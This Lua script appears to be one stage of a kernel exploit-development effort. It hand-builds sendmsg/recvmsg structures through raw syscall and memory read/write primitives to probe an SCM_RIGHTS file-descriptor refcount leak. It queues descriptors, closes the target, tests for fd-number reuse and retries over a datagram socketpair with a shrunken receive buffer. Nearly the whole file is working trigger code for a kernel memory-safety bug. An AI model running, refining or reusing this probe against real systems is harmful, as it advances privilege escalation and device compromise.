-- CRASH_CLASS: LOW
-- PROBE 108b v3: SCM_RIGHTS refcount leak -- no buffer fill
--
-- Skip the buffer-fill approach (write blocks).
-- Instead test: does SCM_RIGHTS sendmsg with MSG_DONTWAIT
-- succeed or fail? If it always succeeds, we need a different
-- way to trigger the refcount leak path.

print("=== 108b v3: SCM_RIGHTS LEAK TEST ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- A: socketpair + SCM_RIGHTS baseline (no buffer tricks)
print("")
print("--- A: BASELINE ---")
local sv = memory.alloc(8)
safe_wd(sv, 0)
safe_wd(sv + 4, 0)
pcall(function() make_syscall(135)(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
local fd_a = safe_rd(sv)
local fd_b = safe_rd(sv + 4)
print("pair: " .. tostring(fd_a) .. "," .. tostring(fd_b))

local tgt = to_num(make_syscall(97)(uint64(1), uint64(1), uint64(0)))
print("tgt=" .. tgt)

-- Send SCM_RIGHTS helper (inline, no function def issues)
local function do_scm_send(sfd, tfd, flags)
    local id = memory.alloc(8)
    safe_wd(id, 0x41)
    local iv = memory.alloc(16)
    safe_wq(iv, uint64(id))
    safe_wq(iv + 8, uint64(1))
    local cm = memory.alloc(32)
    for i = 0, 31, 4 do safe_wd(cm + i, 0) end
    safe_wd(cm, 20)
    safe_wd(cm + 4, 0xFFFF)
    safe_wd(cm + 8, 1)
    safe_wd(cm + 16, tfd)
    local mg = memory.alloc(48)
    for i = 0, 47, 4 do safe_wd(mg + i, 0) end
    safe_wq(mg + 16, uint64(iv))
    safe_wd(mg + 24, 1)
    safe_wq(mg + 32, uint64(cm))
    safe_wd(mg + 40, 24)
    local ok, ret = pcall(function()
        return make_syscall(28)(uint64(sfd), uint64(mg), uint64(flags))
    end)
    if not ok then return -999 end
    return to_num(ret)
end

-- baseline send
local r1 = do_scm_send(fd_b, tgt, 0)
print("send1 ret=" .. r1)

-- receive it to clear
local function do_recv(rfd)
    local id = memory.alloc(8)
    local iv = memory.alloc(16)
    safe_wq(iv, uint64(id))
    safe_wq(iv + 8, uint64(1))
    local cm = memory.alloc(64)
    for i = 0, 63, 4 do safe_wd(cm + i, 0) end
    local mg = memory.alloc(48)
    for i = 0, 47, 4 do safe_wd(mg + i, 0) end
    safe_wq(mg + 16, uint64(iv))
    safe_wd(mg + 24, 1)
    safe_wq(mg + 32, uint64(cm))
    safe_wd(mg + 40, 64)
    local ok, ret = pcall(function()
        return make_syscall(27)(uint64(rfd), uint64(mg), uint64(0))
    end)
    if not ok then return -999, nil end
    return to_num(ret), safe_rd(cm + 16)
end

local rr, rfd = do_recv(fd_a)
print("recv ret=" .. rr .. " fd=" .. tostring(rfd))
if rfd and rfd >= 0 then
    pcall(function() make_syscall(6)(uint64(rfd)) end)
end

-- B: Send many SCM_RIGHTS without receiving (queue them up)
print("")
print("--- B: QUEUE SCM_RIGHTS (no recv) ---")
for i = 1, 20 do
    local rv = do_scm_send(fd_b, tgt, 0x80) -- MSG_DONTWAIT
    if i <= 10 then
        print("  send " .. i .. ": ret=" .. rv)
    end
    if rv > 0x80000000 then
        print("  FAILED at send " .. i)
        print("  total queued: " .. (i - 1))
        break
    end
    if i == 20 then
        print("  all 20 succeeded")
    end
end

-- C: Close target WITHOUT receiving queued fds
print("")
print("--- C: CLOSE TARGET (refcount test) ---")
print("closing tgt=" .. tgt)
pcall(function() make_syscall(6)(uint64(tgt)) end)

-- Check if fd number gets reused
local new_fds = {}
for i = 1, 5 do
    local ok, nf = pcall(function()
        return to_num(make_syscall(97)(uint64(1), uint64(1), uint64(0)))
    end)
    if ok then table.insert(new_fds, nf) end
end
print("new fds: " .. table.concat(new_fds, ","))
local reused = false
for _, f in ipairs(new_fds) do
    if f == tgt then reused = true end
end
print("tgt " .. tgt .. " reused=" .. tostring(reused))

-- D: Now drain the queued SCM_RIGHTS messages
print("")
print("--- D: DRAIN QUEUED ---")
for i = 1, 25 do
    local dr, df = do_recv(fd_a)
    if i <= 10 or dr > 0x80000000 then
        print("  recv " .. i .. ": ret=" .. dr .. " fd=" .. tostring(df))
    end
    if dr > 0x80000000 then
        print("  drained " .. (i - 1) .. " messages")
        break
    end
    if df and df >= 0 then
        pcall(function() make_syscall(6)(uint64(df)) end)
    end
end

-- E: DGRAM socketpair (message-oriented, easier to fill)
print("")
print("--- E: DGRAM PAIR ---")
local sv2 = memory.alloc(8)
safe_wd(sv2, 0)
safe_wd(sv2 + 4, 0)
local ok_dg, ret_dg = pcall(function()
    return make_syscall(135)(uint64(1), uint64(2), uint64(0), uint64(sv2))
end)
local dg_a = safe_rd(sv2)
local dg_b = safe_rd(sv2 + 4)
print("dgram pair: ok=" .. tostring(ok_dg) .. " fds=" .. tostring(dg_a) .. "," .. tostring(dg_b))

if dg_a and dg_a >= 0 then
    local tgt2 = to_num(make_syscall(97)(uint64(1), uint64(1), uint64(0)))
    print("tgt2=" .. tgt2)

    -- Set tiny rcvbuf on receiver
    local ob = memory.alloc(4)
    safe_wd(ob, 1)
    pcall(function()
        make_syscall(105)(uint64(dg_a), uint64(0xFFFF), uint64(0x1002), uint64(ob), uint64(4))
    end)

    -- Send SCM_RIGHTS over DGRAM with MSG_DONTWAIT
    for i = 1, 20 do
        local rv = do_scm_send(dg_b, tgt2, 0x80)
        if i <= 10 then
            print("  dg send " .. i .. ": ret=" .. rv)
        end
        if rv > 0x80000000 then
            print("  DGRAM failed at " .. i)
            break
        end
    end

    pcall(function() make_syscall(6)(uint64(tgt2)) end)
    pcall(function() make_syscall(6)(uint64(dg_a)) end)
    pcall(function() make_syscall(6)(uint64(dg_b)) end)
end

-- cleanup
for _, f in ipairs(new_fds) do pcall(function() make_syscall(6)(uint64(f)) end) end
pcall(function() make_syscall(6)(uint64(fd_a)) end)
pcall(function() make_syscall(6)(uint64(fd_b)) end)

print("")
print("=== 108b v3 DONE ===")
